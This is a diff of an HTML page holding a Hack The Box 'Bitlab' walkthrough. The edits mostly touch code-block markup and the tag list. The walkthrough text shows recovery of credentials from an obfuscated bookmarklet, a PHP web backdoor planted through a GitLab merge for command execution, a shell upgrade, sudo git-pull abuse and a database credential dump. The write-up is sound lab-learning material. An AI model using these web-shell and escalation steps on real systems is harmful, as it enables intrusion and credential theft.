@@ -104,7 +104,7 @@ reverse engineering on a Windows binary.</p>
 <h2 id="recon">Recon</h2>
 <p>Let us start as always by a <code>nmap</code> scan. Only the ports 22 (SSH) and 80 (HTTP)
 are open:</p>
-<div class="highlight"><pre><span class="code-line"><span></span># Nmap 7.80 scan initiated Mon Nov 25 13:23:49 2019 as: nmap -p- -oA nmap 10.10.10.114</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Mon Nov 25 13:23:49 2019 as: nmap -p- -oA nmap 10.10.10.114</span>
 <span class="code-line">Nmap scan report for 10.10.10.114</span>
 <span class="code-line">Host is up (0.099s latency).</span>
 <span class="code-line">Not shown: 65533 filtered ports</span>
@@ -113,14 +113,14 @@ are open:</p>
 <span class="code-line">80/tcp open  http</span>
 <span class="code-line"></span>
 <span class="code-line"># Nmap done at Mon Nov 25 13:26:14 2019 -- 1 IP address (1 host up) scanned in 145.18 seconds</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="web">Web</h2>
 <p>The home page is a <a href="https://about.gitlab.com/">gitlab</a> home page.</p>
 <p>We run a <a href="https://tools.kali.org/web-applications/dirb">dirb</a> against the home
 page and discover a few pages and directory.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>-----------------</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>-----------------</span>
 <span class="code-line">DIRB v2.22</span>
 <span class="code-line">By The Dark Raver</span>
 <span class="code-line">-----------------</span>
@@ -159,7 +159,7 @@ page and discover a few pages and directory.</p>
 <span class="code-line">-----------------</span>
 <span class="code-line">END_TIME: Mon Nov 25 13:44:24 2019</span>
 <span class="code-line">DOWNLOADED: 9224 - FOUND: 12</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="gitlab-unauthenticated">Gitlab unauthenticated</h2>
@@ -175,13 +175,13 @@ listing page linking to a bookmarks page with a few bookmarks.</p>
   javascript:(function(){%20var%20_0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document<a href="_0x4b18[1]">_0x4b18[2]</a>[_0x4b18[0]]=%20_0x4b18[3];document<a href="_0x4b18[4]">_0x4b18[2]</a>[_0x4b18[0]]=%20_0x4b18[5];%20})()</p>
 <p>We use an <a href="https://lelinhtinh.github.io/de4js/">online JavaScript Deobfuscator and Unpacker</a>
 to get the link "true" value:</p>
-<div class="highlight"><pre><span class="code-line"><span></span>javascript: (function () {</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>javascript: (function () {</span>
 <span class="code-line">    % 20</span>
 <span class="code-line">    var % 20 _0x4b18 = [&quot;value&quot;, &quot;user_login&quot;, &quot;getElementById&quot;, &quot;clave&quot;, &quot;user_password&quot;, &quot;11des0081x&quot;];</span>
 <span class="code-line">    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = % 20 _0x4b18[3];</span>
 <span class="code-line">    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = % 20 _0x4b18[5]; % 20</span>
 <span class="code-line">})()</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>The credentials "clave" and "11des0081x" allow us to connect to the gitlab. We
@@ -191,16 +191,16 @@ have access to two projects owned by the "administrator" user: "Profile" and
 <h2 id="gitlab-authenticated">Gitlab authenticated</h2>
 <p>The first project is the developer profile seen earlier. The second project is
 the code use to deploy the first project using the following PHP syntax:</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="x">if ($repo==&#39;Profile&#39; &amp;&amp; $branch==&#39;master&#39; &amp;&amp; $event==&#39;merge_request&#39; &amp;&amp; $state==&#39;merged&#39;) {</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="x">if ($repo==&#39;Profile&#39; &amp;&amp; $branch==&#39;master&#39; &amp;&amp; $event==&#39;merge_request&#39; &amp;&amp; $state==&#39;merged&#39;) {</span></span>
 <span class="code-line"><span class="x">    echo shell_exec(&#39;cd ../profile/; sudo git pull&#39;),&quot;\n&quot;;</span></span>
 <span class="code-line"><span class="x">}</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We can add a PHP simple reverse shell (the one in
 <code>/usr/share/webshells/php/simple-backdoor.php</code> on Kali), make a pull request and
 merge it from the gitlab interface.</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="x">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="x">&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="cp">&lt;?php</span></span>
 <span class="code-line"></span>
@@ -217,7 +217,7 @@ merge it from the gitlab interface.</p>
 <span class="code-line"><span class="x">Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd</span></span>
 <span class="code-line"></span>
 <span class="code-line"><span class="x">&lt;!--    http://michaeldaw.org   2006    --&gt;</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p><img alt="Adding some PHP file" src="/media/2020.01/bitlab_6.png"></p>
@@ -229,7 +229,7 @@ URL.</p>
 We can use <code>python -c 'import pty; pty.spawn("/bin/sh")'</code> in order to get a
 interactive shell. We start enumerating the box and something interesting come
 out: Our user as a <code>sudo</code> permission with no password for <code>/usr/bin/git pull</code>.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>$ sudo -l</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ sudo -l</span>
 <span class="code-line">sudo -l</span>
 <span class="code-line">Matching Defaults entries for www-data on bitlab:</span>
 <span class="code-line">    env_reset, exempt_group=sudo, mail_badpass,</span>
@@ -237,14 +237,14 @@ out: Our user as a <code>sudo</code> permission with no password for <code>/usr/
 <span class="code-line"></span>
 <span class="code-line">User www-data may run the following commands on bitlab:</span>
 <span class="code-line">    (root) NOPASSWD: /usr/bin/git pull</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>My first idea was to try <code>sudo /usr/bin/git pull --help</code> to get the pager as
 root but that doesn't work. The second idea was to create a new git repository
 and play with the post-merge hooks but I didn't had the right to create a new
 git project. It seems like a dead end.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>$ cd /var/www/html</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ cd /var/www/html</span>
 <span class="code-line">$ ls</span>
 <span class="code-line">deployer</span>
 <span class="code-line">help</span>
@@ -258,20 +258,20 @@ git project. It seems like a dead end.</p>
 <span class="code-line">$ chmod +x post-merge</span>
 <span class="code-line">$ sudo /usr/bin/git pull</span>
 <span class="code-line">fatal: this operation must be run in a work tree</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="postgresql">Postgresql</h2>
 <p>By exploring more the gitlab we can found a "snippet" name "Postgresql" containing
 the base of PHP script to connect to the database.</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="cp">&lt;?php</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="cp">&lt;?php</span></span>
 <span class="code-line"><span class="nv">$db_connection</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;</span><span class="p">);</span></span>
 <span class="code-line"><span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_query</span><span class="p">(</span><span class="nv">$db_connection</span><span class="p">,</span> <span class="s2">&quot;SELECT * FROM profiles&quot;</span><span class="p">);</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We complete the script to display the database content.</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="cp">&lt;?php</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="cp">&lt;?php</span></span>
 <span class="code-line"><span class="nv">$db_connection</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=localhost dbname=profiles user=profiles password=profiles&quot;</span><span class="p">);</span></span>
 <span class="code-line"><span class="nv">$result</span> <span class="o">=</span> <span class="nb">pg_query</span><span class="p">(</span><span class="nv">$db_connection</span><span class="p">,</span> <span class="s2">&quot;SELECT * FROM profiles&quot;</span><span class="p">);</span></span>
 <span class="code-line"><span class="nv">$numrows</span> <span class="o">=</span> <span class="nx">pg_numrows</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span></span>
@@ -283,28 +283,28 @@ the base of PHP script to connect to the database.</p>
 <span class="code-line">    <span class="k">echo</span> <span class="s2">&quot;pass: &quot;</span> <span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span></span>
 <span class="code-line"><span class="p">}</span></span>
 <span class="code-line"><span class="cp">?&gt;</span><span class="x"></span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We then deploy it and execute it. The content of the database is
 <code>id: 1user: clavepass: c3NoLXN0cjBuZy1wQHNz==</code>
 Decoding the base64 password give an error as the padding is wrong.</p>
-<div class="highlight"><pre><span class="code-line"><span></span><span class="err">echo -ne &#39;c3NoLXN0cjBuZy1wQHNz&#39; | base64 -d</span></span>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="err">echo -ne &#39;c3NoLXN0cjBuZy1wQHNz&#39; | base64 -d</span></span>
 <span class="code-line"><span class="err">ssh-str0ng-p@ss</span></span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>The decoded password do not work. But using the base64 password is working
 (<strong>WHY WOULD YOU DO THAT?!</strong> this can be a complete brainfuck). We
 can then connect to the box as clave using SSH and get the user flag.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>ssh clave@10.10.10.114</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ssh clave@10.10.10.114</span>
 <span class="code-line">clave@10.10.10.114&#39;s password:</span>
 <span class="code-line">Last login: Tue Nov 26 07:17:40 2019 from 10.10.15.35</span>
 <span class="code-line">clave@bitlab:~$ ls</span>
 <span class="code-line">RemoteConnection.exe  user.txt</span>
 <span class="code-line">clave@bitlab:~$ cat user.txt</span>
 <span class="code-line">1e3fd8&lt;redacted&gt;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h1 id="getting-root">Getting root</h1>
@@ -313,14 +313,14 @@ can then connect to the box as clave using SSH and get the user flag.</p>
 <a href="/media/2020.01/RemoteConnection.exe">here</a>.</p>
 <p>A <code>RemoteConnection.exe</code> binary is available in <code>clave</code>'s home folder.
 We copy it on our local system. It effectively a 32 bits Windows binary.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>file RemoteConnection.exe</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>file RemoteConnection.exe</span>
 <span class="code-line">RemoteConnection.exe: PE32 executable (console) Intel 80386, for MS Windows</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We can run <code>strings</code> in order to find an hard coded password but this is not the
 case here.</p>
-<div class="highlight"><pre><span class="code-line"><span></span>strings RemoteConnection.exe </span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>strings RemoteConnection.exe </span>
 <span class="code-line">!This program cannot be run in DOS mode.</span>
 <span class="code-line">Rich</span>
 <span class="code-line">.text</span>
@@ -342,14 +342,14 @@ case here.</p>
 <span class="code-line">=x@@</span>
 <span class="code-line">=|@@</span>
 <span class="code-line">&lt;SNIP&gt;</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <p>We boot a Windows Box (That is the first time that I boot a Windows box for a
 HTB challenge) and run the binary in it. We got a message <code>Access Denied !!</code></p>
-<div class="highlight"><pre><span class="code-line"><span></span>&gt;RemoteConnection.exe 10.10.10.114</span>
+<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;RemoteConnection.exe 10.10.10.114</span>
 <span class="code-line">Access Denied !!</span>
-</pre></div>
+<span class="code-line"></code></pre></div>
 
 
 <h2 id="x64dbg">x64dbg</h2>
@@ -379,6 +379,9 @@ was interesting at it implies some basic reverse engineering.</p>
       <footer>
           <div>
             <b>Previous article:</b> <a href="https://maggick.fr/2020/01/htb-craft.html"> HTB: Craft </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="https://maggick.fr/2020/02/vault.html"> Vault </a>
           </div>
 
 <div class="social-buttons">
@@ -453,139 +456,52 @@ was interesting at it implies some basic reverse engineering.</p>
 
     <ul>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/screen.html">screen</a>
+              <a href="https://maggick.fr/tag/suid.html">SUID</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/security.html">security</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/vault.html">vault</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/hash.html">hash</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/htb.html">HTB</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/cve.html">cve</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
+              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/api.html">api</a>
             </li>
             <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/misc.html">misc</a>
+              <a href="https://maggick.fr/tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bruteforce.html">bruteforce</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/microsoft.html">microsoft</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/procdump.html">procdump</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+              <a href="https://maggick.fr/tag/lorem-ipsum.html">lorem ipsum</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+              <a href="https://maggick.fr/tag/rop.html">ROP</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/drupal.html">drupal</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/server.html">server</a>
-            </li>
-            <li class="tag tag-3">
-              <a href="https://maggick.fr/tag/git.html">git</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/programming.html">programming</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/leak.html">leak</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/devops.html">devops</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/smb.html">smb</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/suid.html">SUID</a>
-            </li>
-            <li class="tag tag-2">
-              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/mail.html">mail</a>
-            </li>
-            <li class="tag tag-1">
-              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ret2libc.html">ret2libc</a>
+              <a href="https://maggick.fr/tag/sqli.html">SQLi</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/blog.html">blog</a>
@@ -594,40 +510,127 @@ was interesting at it implies some basic reverse engineering.</p>
               <a href="https://maggick.fr/tag/code-review.html">code review</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/python.html">python</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/sstic.html">sstic</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/rop.html">ROP</a>
+              <a href="https://maggick.fr/tag/centreon.html">centreon</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/windows.html">windows</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
+              <a href="https://maggick.fr/tag/cygwin.html">cygwin</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/boot2root.html">boot2root</a>
             </li>
             <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+              <a href="https://maggick.fr/tag/chrome.html">chrome</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/leak.html">leak</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/hash.html">hash</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cisco.html">Cisco</a>
             </li>
             <li class="tag tag-4">
               <a href="https://maggick.fr/tag/waf.html">WAF</a>
             </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/ndh.html">ndh</a>
-            </li>
-            <li class="tag tag-4">
-              <a href="https://maggick.fr/tag/buffer-overflow.html">buffer overflow</a>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/challenge.html">challenge</a>
             </li>
             <li class="tag tag-3">
               <a href="https://maggick.fr/tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cmus.html">cmus</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/screen.html">screen</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/osmc.html">osmc</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/kiosk.html">kiosk</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/bypass.html">bypass</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/mail.html">mail</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/python.html">python</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/security.html">security</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/gogs.html">gogs</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/ssl.html">SSL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="https://maggick.fr/tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/postgresql.html">postgresql</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="https://maggick.fr/tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/lets-encrypt.html">let's encrypt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/exchange.html">exchange</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/server.html">server</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/meterpreter.html">meterpreter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/smb.html">smb</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/raspberry.html">raspberry</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/x64dbg.html">x64dbg</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/cve.html">cve</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="https://maggick.fr/tag/ctf.html">ctf</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/cryptography.html">cryptography</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="https://maggick.fr/tag/msfvenom.html">msfvenom</a>
             </li>
     </ul>
 </section>
